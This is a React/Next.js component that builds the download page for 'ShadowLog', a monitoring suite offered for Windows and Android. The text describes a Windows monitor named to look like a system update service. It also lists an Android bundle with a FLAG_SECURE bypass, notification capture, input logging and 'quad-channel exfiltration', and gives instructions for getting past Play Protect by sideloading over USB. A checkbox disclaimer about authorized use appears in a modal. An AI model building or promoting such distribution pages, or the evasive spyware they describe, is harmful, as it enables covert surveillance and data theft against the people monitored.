'use client';

import { useState, useEffect, useRef, useCallback } from 'react';
import Link from 'next/link';

const TIMER_DURATION = 10;
const CIRCUMFERENCE = 2 * Math.PI * 36;
const WIN_DOWNLOAD_URL = 'https://github.com/BGx-11/ShadowLog/releases/latest/download/ShadowLog_Win_v4.0.zip';

export default function DownloadSection() {
  const [modalOpen, setModalOpen] = useState(false);
  const [timerValue, setTimerValue] = useState(TIMER_DURATION);
  const [timerDone, setTimerDone] = useState(false);
  const [checks, setChecks] = useState([false, false]);
  const [platform, setPlatform] = useState('win');
  const intervalRef = useRef(null);

  const allChecked = checks.every(Boolean);
  const ready = timerDone && allChecked;

  const openModal = useCallback((selectedPlatform) => {
    setPlatform(selectedPlatform);
    setModalOpen(true);
    setTimerValue(TIMER_DURATION);
    setTimerDone(false);
    setChecks([false, false]);
    document.body.style.overflow = 'hidden';
  }, []);

  const closeModal = useCallback(() => {
    setModalOpen(false);
    document.body.style.overflow = '';
    if (intervalRef.current) clearInterval(intervalRef.current);
  }, []);

  useEffect(() => {
    if (!modalOpen) return;
    intervalRef.current = setInterval(() => {
      setTimerValue((prev) => {
        if (prev <= 1) {
          clearInterval(intervalRef.current);
          setTimerDone(true);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(intervalRef.current);
  }, [modalOpen]);

  const toggleCheck = (index) => {
    setChecks((prev) => {
      const copy = [...prev];
      copy[index] = !copy[index];
      return copy;
    });
  };

  const handleDownload = () => {
    if (!ready) return;
    window.location.href = platform === 'win' 
        ? WIN_DOWNLOAD_URL 
        : 'https://github.com/BGx-11/ShadowLog/releases/latest/download/ShadowLog_Android_v4.0.zip';
    setTimeout(closeModal, 2000);
  };

  const progress = (TIMER_DURATION - timerValue) / TIMER_DURATION;
  const dashOffset = progress * CIRCUMFERENCE;

  return (
    <>
      <section className="section" id="download">
        <div className="container">
          <div className="sectionHeader reveal">
            <span className="sectionLabel">Release</span>
            <h2 className="sectionTitle">Download ShadowLog</h2>
            <p className="sectionDesc">Choose your platform. All archives include documentation and companion utilities.</p>
            <p className="dlPreNote reveal">
              Before downloading, please review the <a href="#setup">Getting Started</a> guide, <a href="#tools">Tools &amp; Support</a>, <Link href="/terms">Terms of Service</Link>, and <Link href="/privacy">Privacy Policy</Link>.
            </p>
          </div>

          {/* ── PLATFORM CARDS GRID ── */}
          <div className="dlGrid reveal delay-1">

            {/* ── WINDOWS CARD ── */}
            <div className="dlCard">
              <div className="dlCardHeader">
                <div className="dlPlatformIcon dlPlatformWin">
                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
                </div>
                <div>
                  <h3 className="dlCardTitle">Windows</h3>
                  <p className="dlCardSub">x64 — Windows 10/11</p>
                </div>
              </div>

              <p className="dlCardDesc">
                Core monitor, forensic decryptor dashboard, and system uninstaller. Single self-contained archive — no runtime dependencies.
              </p>

              <div className="dlMeta">
                <span className="dlBadge">v4.0</span>
                <span className="dlBadge">10.3 MB</span>
                <span className="dlBadge">.zip</span>
              </div>

              <ul className="dlIncludes">
                <li>WinUpdateSvc.exe <span>— Monitor</span></li>
                <li>Decryptor.exe <span>— Forensic Dashboard</span></li>
                <li>Uninstaller.exe <span>— Clean Removal</span></li>
              </ul>

              <button className="btn btn-primary dlBtn" onClick={() => openModal('win')}>
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
                Download for Windows
              </button>
            </div>

            {/* ── ANDROID CARD ── */}
            <div className="dlCard">
              <div className="dlCardHeader">
                <div className="dlPlatformIcon dlPlatformAndroid">
                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>
                </div>
                <div>
                  <h3 className="dlCardTitle">Android</h3>
                  <p className="dlCardSub">Android 8.0+ (Oreo)</p>
                </div>
              </div>

              <p className="dlCardDesc">
                Full mobile monitoring suite — FLAG_SECURE bypass, notification capture, input logging, and quad-channel exfiltration.
              </p>

              <div className="dlMeta">
                <span className="dlBadge">v2.0</span>
                <span className="dlBadge">~3 MB</span>
                <span className="dlBadge">.zip</span>
              </div>

              <ul className="dlIncludes">
                <li>ShadowLog-Monitor.apk <span>— Core Service</span></li>
                <li>ShadowLog-Controller.apk <span>— Remote Management</span></li>
                <li>install-mobile.bat <span>— USB Installer</span></li>
              </ul>

              <button className="btn btn-primary dlBtn dlBtnAndroidStyle" onClick={() => openModal('android')}>
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
                Download for Android
              </button>

              {/* ── INSTALL FALLBACK NOTICE ── */}
              <div className="dlNotice">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
                <span>
                  If APK installation is blocked by Play Protect, extract the archive on a laptop, connect your phone via USB, and run <code>install-mobile.bat</code> to deploy both apps automatically.
                </span>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* ── SECURITY ACKNOWLEDGMENT MODAL ── */}
      <div className={`modalOverlay ${modalOpen ? 'modalOverlayActive' : ''}`} onClick={(e) => { if (e.target === e.currentTarget) closeModal(); }}>
        <div className={`modal ${platform === 'android' ? 'modalAndroid' : 'modalWin'}`}>
          <div className={`modalIcon ${platform === 'android' ? 'modalIconAndroid' : 'modalIconWin'}`}>
            <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
          </div>
          <h2>{platform === 'android' ? 'Mobile Security Acknowledgment' : 'Security Acknowledgment'}</h2>
          <p>This is a powerful {platform === 'android' ? 'mobile' : 'systems'} monitoring framework. Unauthorized surveillance is a serious criminal offense under the CFAA and international privacy laws.</p>

          <label className="checkboxItem">
            <input type="checkbox" checked={checks[0]} onChange={() => toggleCheck(0)} />
            <span>I confirm I will ONLY deploy this on systems I personally own or have explicit written authorization to monitor.</span>
          </label>
          <label className="checkboxItem">
            <input type="checkbox" checked={checks[1]} onChange={() => toggleCheck(1)} />
            <span>I have read the <Link href="/terms" target="_blank" onClick={e => e.stopPropagation()}>Terms of Service</Link> and <Link href="/privacy" target="_blank" onClick={e => e.stopPropagation()}>Privacy Policy</Link> and accept full personal legal responsibility for my use of this software.</span>
          </label>

          <div className="timerRingContainer">
            <div className={`timerRing ${platform === 'android' ? 'timerRingAndroid' : 'timerRingWin'}`}>
              <svg viewBox="0 0 80 80">
                <circle className="timerRingBg" cx="40" cy="40" r="36"/>
                <circle className={`timerRingProgress ${platform === 'android' ? 'timerRingProgressAndroid' : 'timerRingProgressWin'}`} cx="40" cy="40" r="36" style={{ strokeDasharray: CIRCUMFERENCE, strokeDashoffset: dashOffset }}/>
              </svg>
              <div className="timerText">{timerDone ? '✓' : timerValue}</div>
            </div>
          </div>

          <button className={`btn btn-primary downloadFinalBtn ${platform === 'android' ? 'downloadFinalBtnAndroid' : 'downloadFinalBtnWin'}`} disabled={!ready} onClick={handleDownload}>
            {ready ? `Download for ${platform === 'android' ? 'Android' : 'Windows'}` : 'Awaiting Acknowledgment...'}
          </button>
        </div>
      </div>
    </>
  );
}
